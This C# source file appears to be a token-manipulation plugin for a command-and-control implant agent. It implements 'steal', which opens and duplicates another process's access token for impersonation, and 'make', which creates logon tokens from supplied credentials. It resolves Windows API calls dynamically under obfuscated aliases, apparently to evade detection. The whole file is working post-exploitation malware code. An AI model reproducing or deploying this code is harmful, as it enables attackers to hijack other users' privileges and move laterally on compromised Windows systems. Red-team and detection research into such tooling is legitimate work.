using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Diagnostics;
using System.Security.Principal;
using Invoker.Dynamic;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "token";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private delegate bool logonUsrDelegate(string lpszUserName, string lpszDomain, string lpszPassword, Native.LogonType dwLogonType, Native.LogonProvider dwLogonProvider, out SafeAccessTokenHandle phToken, out object obj, out object obj2, out object obj3, out object obj4);
        private delegate bool openProcTokenDelegate(IntPtr ProcessHandle, uint desiredAccess, out SafeAccessTokenHandle TokenHandle);
        private delegate bool dupeTokenDelegate(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, Native.TOKEN_TYPE TokenType, out SafeAccessTokenHandle phNewToken);
        private delegate bool closeHandleDelegate(IntPtr hObject);
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            List<string> funcs = new List<string>()
            {
                "lgu",
                "opt",
                "dte",
            };

            if(!Resolver.TryResolveFuncs(funcs, "aa32", out var err))
            {
                await messageManager.WriteLine(err, job.task.id, true, "error");
                return;
            }

            switch(args["action"].ToLower())
            {
                case "steal":
                    StealToken(job, args);
                    break;
                case "make":
                    MakeToken(job);
                    break;
                case "list":
                    await messageManager.AddResponse(tokenManager.List(job));
                    break;
                default:
                    await messageManager.AddResponse(new TaskResponse()
                    {
                        user_output = $"Failed: Invalid action specified.",
                        status = "errored",
                        completed = true,
                        task_id = job.task.id,
                    }.ToJson());
                    break;
            }
        }
        private void MakeToken(ServerJob job)
        {
            CreateToken tokenOptions = JsonSerializer.Deserialize(job.task.parameters, CreateTokenJsonContext.Default.CreateToken);
            SafeAccessTokenHandle hToken = new SafeAccessTokenHandle();
            try
            {
                Native.LogonType logonType;
                if (tokenOptions.netOnly)
                {
                    logonType = Native.LogonType.LOGON32_LOGON_NETWORK;
                }
                else
                {
                    logonType = Native.LogonType.LOGON32_LOGON_INTERACTIVE;
                }

                //object[] logonParams = new object[] { tokenOptions.username, tokenOptions.domain, tokenOptions.password, logonType, Native.LogonProvider.LOGON32_PROVIDER_DEFAULT, hToken, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero };
                //bool result = Generic.InvokeFunc<bool>(luFunc, typeof(logonUsrDelegate), ref logonParams);

                if(!Native.LogonUser(
                    tokenOptions.username,
                    tokenOptions.domain,
                    tokenOptions.password,
                    tokenOptions.netOnly ? Native.LogonType.LOGON32_LOGON_NETWORK : Native.LogonType.LOGON32_LOGON_INTERACTIVE,
                    Native.LogonProvider.LOGON32_PROVIDER_DEFAULT,
                    out hToken
                    ))
                {
                    messageManager.AddResponse(new TaskResponse()
                    {
                        user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                        completed = true,
                        task_id = job.task.id,
                    }.ToJson());
                    return;
                }

                //hToken = (SafeAccessTokenHandle)logonParams[5];
                messageManager.AddResponse(this.tokenManager.AddToken(hToken, tokenOptions, job.task.id).ToJson());
                return;
            }
            catch (Exception e)
            {
                messageManager.AddResponse(new TaskResponse()
                {
                    user_output = $"Failed: {e}",
                    status = "errored",
                    completed = true,
                    task_id = job.task.id,
                }.ToJson());
            }
        }

        private void StealToken(ServerJob job, Dictionary<string, string> args)
        {
            if (!args.ContainsKey("pid"))
            {
                messageManager.AddResponse(new TaskResponse()
                {
                    user_output = $"Failed: no pid specified.",
                    status = "errored",
                    completed = true,
                    task_id = job.task.id,
                }.ToJson());
                return;
            }

            if (int.TryParse(args["pid"], out var pid))
            {
                try
                {
                    Process proc = Process.GetProcessById(pid);
                    SafeAccessTokenHandle hToken = new SafeAccessTokenHandle();
                    SafeAccessTokenHandle dupHandle = new SafeAccessTokenHandle();
                    
                    SafeAccessTokenHandle procHandle = new SafeAccessTokenHandle(proc.Handle);

                    object[] optParams = new object[] { procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, hToken};

                    bool result = Generic.InvokeFunc<bool>(Resolver.GetFunc("opt"), typeof(openProcTokenDelegate), ref optParams);

                    if (!result)
                    {
                        messageManager.AddResponse(new TaskResponse()
                        {
                            user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                            status = "errored",
                            completed = true,
                            task_id = job.task.id,
                        }.ToJson());
                        return;
                    }

                    hToken = (SafeAccessTokenHandle)optParams[2];
                    object[] dtParams = new object[] { hToken.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, (uint)TokenImpersonationLevel.Impersonation, Native.TOKEN_TYPE.TokenImpersonation, dupHandle };

                    result = Generic.InvokeFunc<bool>(Resolver.GetFunc("dte"), typeof(dupeTokenDelegate), ref dtParams);

                    if (!result)
                    {
                        messageManager.AddResponse(new TaskResponse()
                        {
                            user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                            status = "errored",
                            completed = true,
                            task_id = job.task.id,
                        }.ToJson());
                        return;
                    }
                    
                    dupHandle = (SafeAccessTokenHandle)dtParams[5];

                    if(dupHandle.IsInvalid)
                    {
                        messageManager.AddResponse(new TaskResponse()
                        {
                            user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                            status = "errored",
                            completed = true,
                            task_id = job.task.id,
                        }.ToJson());
                        return;
                    }


                    CreateToken tokenOptions = new CreateToken();
                    tokenOptions.name = $"Process {proc.Id} (Duplicated)";
                    tokenOptions.username = proc.Id.ToString();
                    tokenOptions.domain = "stolen";
                    var response = this.tokenManager.AddToken(dupHandle, tokenOptions, job.task.id);

                    response.tokens.First().process_id = proc.Id;

                    messageManager.AddResponse(response.ToJson());

                    hToken.Dispose();
                }
                catch (Exception e)
                {
                    messageManager.AddResponse(new TaskResponse()
                    {
                        user_output = $"Failed: {e}",
                        status = "errored",
                        completed = true,
                        task_id = job.task.id,
                    }.ToJson());
                }
            
            }
        }
    }
}